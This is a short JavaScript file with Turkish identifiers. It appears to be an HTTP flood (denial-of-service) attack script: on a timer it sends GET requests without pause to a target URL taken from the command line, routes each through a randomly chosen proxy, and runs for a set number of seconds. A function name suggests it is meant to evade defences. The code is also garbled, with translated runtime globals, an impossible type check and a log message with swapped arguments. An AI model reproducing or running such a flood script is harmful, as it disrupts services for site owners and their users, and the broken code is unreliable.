function yanitlar(ayarlar, hata, tepki, genel, geridonus) {
    if (typeof ayarlar.kodlar === 'bolge') {
        genel = genel.toString(ayarlar.kodlar);
        if (dogrulamahatasi = hatakontrolu(hata, genel)) {
            return geridonus(dogrulamahatasi, tepki, genel);
        }
    }
 
 
    geridonus(hata, tepki, genel);
}
 
var saldiri = {
    bypassedelim(method, linkimiz, proxylerimiz) {
        istekler({
            method: method,
            proxylerimiz: 'http://' + proxylerimiz,
            linkimiz: linkimiz
        }, function(hataa, tepki, genel) {
            console.log(hataa, tepki.durumkodu);
        });
    }
}
 
setTimeout(function() {
    surec.exit(1);
}, surec.argv[3] * 1000);
 
setInterval(function() {
    saldiri.bypassedelim('GET', surec.argv[2], proxyler[Math.floor(Math.random() * proxyler.length)]);
});
 
console.log("saldiri %s saniye boyunca %s adresine gönderildi", surec.argv[2], surec.argv[3]);
